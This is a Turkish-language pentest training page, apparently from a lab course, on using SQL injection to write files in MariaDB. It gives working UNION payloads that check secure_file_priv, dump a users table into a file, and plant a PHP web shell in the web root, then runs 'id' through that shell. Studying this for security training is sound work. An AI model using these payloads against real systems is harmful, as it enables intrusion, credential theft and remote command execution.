# Writing Files

!!! warning

    FILE ayrıcalığı gereklidir.

## [SECURE_FILE_PRIV](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)

!!! abstract

    * Değer dolu değil ise okuma/yazma yapılabilir.
    * Değer dolu ise belirtilen konumda okuma/yazma yapılabilir.
    * Değer NULL ise okuma/yazma yapılamaz.

```sql title="Payload"
CN' UNION SELECT 1,VARIABLE_NAME,VARIABLE_VALUE,4 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME = "secure_file_priv"-- -
```

| PORT CODE | PORT CITY |
|---|---|
| SECURE_FILE_PRIV ||

## SELECT INTO OUTFILE

!!! tip

    Binary dosyaları yazmak için [FROM_BASE64](https://mariadb.com/kb/en/from_base64/) fonksiyonu kullanılabilir.

[SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) ifadesi, sorgu sonuçlarını dosyalara yazmak için kullanılabilir:

```mysql
MariaDB [ilfreight]> SELECT * FROM users INTO OUTFILE "/tmp/credentials.txt";
```

[SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) ifadesi, keyfi dizileri dosyalara yazmak için kullanılabilir:

```mysql
MariaDB [ilfreight]> SELECT "this is a test" INTO OUTFILE "/tmp/test.txt";
```

## Writing an SQL Injection

Dosya yazma işlemi için web root dizinini bilmemiz gerekir.

Bazı web sunucuları için varsayılan web root dizinleri aşağıda verilmiştir:

| WEB SERVER | WEB ROOT | CONFIGURATION |
|---|---|---|
| Apache | /var/www/html/ | /etc/apache2/apache2.conf |
| Nginx | /usr/local/nginx/html/ | /etc/nginx/nginx.conf |
| IIS | C:\inetpub\wwwroot\ | %WinDir%\System32\Inetsrv\Config\ApplicationHost.config |
| XAMPP | C:\xampp\htdocs\ | C:\xampp\apache\conf\httpd.conf |

Arka sunucuda bir kanıt dosyası oluşturmak için aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,"file written successfully",3,4 INTO OUTFILE "/var/www/html/proof.txt"-- -
```

Yazılan dosyanın bulunduğu konuma gidelim:

```sh
my@attack:~$ firefox "http://83.136.251.254:54422/proof.txt"
```

Dosya içeriği sayfada görüntülenir:

```output title="Output"
1    file written successfully    3    4
```

## Writing a Web Shell

Arka uç sunucuda bir PHP shell oluşturmak için aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE "/var/www/html/shell.php"-- -
```

Shell dosyanın bulunduğu konuma gidelim ve ?0=id ile bir GET isteği gerçekleştirelim:

```sh
my@attack:~$ firefox "http://83.136.251.254:54422/shell.php?0=id"
```

Komut çıktısı sayfada görüntülenir:

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
